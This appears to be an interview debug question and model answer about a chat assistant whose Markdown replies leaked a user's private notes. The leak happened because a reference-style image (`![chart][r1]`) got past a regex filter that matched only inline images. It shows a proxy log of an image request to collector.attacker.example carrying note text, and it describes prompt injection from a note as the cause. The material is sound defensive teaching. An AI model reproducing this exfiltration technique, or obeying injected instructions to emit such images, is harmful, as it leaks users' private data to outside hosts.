## Question

<Callout kind="interview" label="Debug round">
A chat assistant that can read the user's notes renders its replies as Markdown. After an earlier report the team shipped a filter that removes images not hosted on the company CDN. A week later the security team sees a request from a user's browser to an unknown host, with text from the user's private notes in the query string. Several things are wrong with this code. Which one explains this request?
</Callout>

The server streams the reply and filters it on the way out:

```python
import re
from urllib.parse import urlparse

ALLOWED_IMG_HOSTS = {"cdn.example.com"}
INLINE_IMG = re.compile(r"!\[[^\]]*\]\(\s*([^)\s]+)[^)]*\)")

def _check(m):
    host = urlparse(m.group(1)).hostname
    return m.group(0) if host in ALLOWED_IMG_HOSTS else "[image removed]"

def filter_images(markdown):
    return INLINE_IMG.sub(_check, markdown)

async def stream_reply(model_stream, send_to_client, store):
    sent = []
    async for chunk in model_stream:
        safe = filter_images(chunk)
        sent.append(safe)
        await send_to_client(safe)
    store.save_reply("".join(sent))
```

The client appends chunks and re-renders the whole reply with markdown-it (CommonMark preset, raw HTML disabled). The page has no Content Security Policy for images.

The evidence the security team has:

```text
proxy log    GET https://collector.attacker.example/c.png?n=renewal%20terms%20for%20...
             Sec-Fetch-Dest: image   Referer: https://chat.example.com/
SIEM copy    "Here is the summary you asked for.\n\n![chart][r1]\n\n" [truncated]
user report  "I didn't click anything."
```

The full stored reply sits in the conversation store, which the security team can read only after a privacy approval that takes days (scenario).

## Answer

The defect that explains the request is the regex's blind spot. It matches inline images, `![alt](url)`, and nothing else. CommonMark also has reference-style images: `![chart][r1]` in the text and `[r1]: url` on its own line. The truncated SIEM copy already shows `![chart][r1]`, the stored reply is the filtered reply, and the request was an image load (`Sec-Fetch-Dest: image`) that the user did not click. The definition line falls after the truncation, so the full reply is still needed to confirm it, but the evidence in hand fits only this hypothesis. EchoLeak used reference-style Markdown for the same reason: the redaction it bypassed looked only for inline syntax.

**Ranking the other defects.** The per-chunk filter is the next most serious: an inline image whose URL is split across two chunks passes, and streaming boundaries are not under your control. It did not cause this request, because a split inline image is stored as an inline image. The unfiltered links rank third: they leak only with a click, and the link text can make that click likely. The missing CSP is not a choice above because it is stated, and it is the control that would have stopped this request whatever the filter missed.

**What to do before the full reply arrives.** Ship the CSP first: `img-src` limited to hosts you control. It is deterministic and does not depend on parsing. Then replace the regex: render once on the server with the same markdown-it configuration as the client, walk the token stream and drop image tokens whose host is not allowed, so every syntax the renderer understands is covered. Filter the accumulated reply, not each chunk, and only send what has passed.

**The re-scan window, your choice.** The filter shipped a week ago, but before it there was no filter at all, so the exposure window is the whole retention of stored replies, not one week. Scan every stored reply for image references to hosts outside the allowlist and join with proxy logs on the host. A one-week scan is the unreasonable choice: it covers the period with the filter and skips the period without one.

**The conflict.** The product team renders charts from the model as images. A strict `img-src` keeps them only if the chart service is on a host you control that serves only generated files; a general storage domain on the allowlist reopens the channel, since anyone can host a file there.

**Where the fix fails.** Parsing on the server with the client's library covers the syntax that library supports today; a client upgrade that enables a new extension (autolinks, raw HTML) reopens it unless the server and client are pinned together. The CSP is what survives that drift. Neither control removes the injection: some note or document told the model to write that reply, and it is still in the user's data.

## Follow-ups

- *Is a CSP enough on its own?* It stops the browser fetch. It does not stop a model-written link carrying the data, so links from model output need their real destination shown, or a click-through warning for hosts outside the allowlist.
- *Where did the instruction come from?* Probably a note or shared document the model read in that conversation; the full stored context, once approved, names it.
- *The privacy approval takes days. What do you do without it?* Ship the CSP and the server-side parser now; they are correct whatever the full reply says.

## Common mistakes

- Patching the regex to match `[id]: url` lines and stopping; the next syntax needs another patch, so parse instead.
- Allowlisting a broad domain such as a cloud storage service that anyone can upload to.
- Treating it as a model failure. The model wrote text; the renderer turned it into a network request.
- Scanning only the week since the filter shipped.
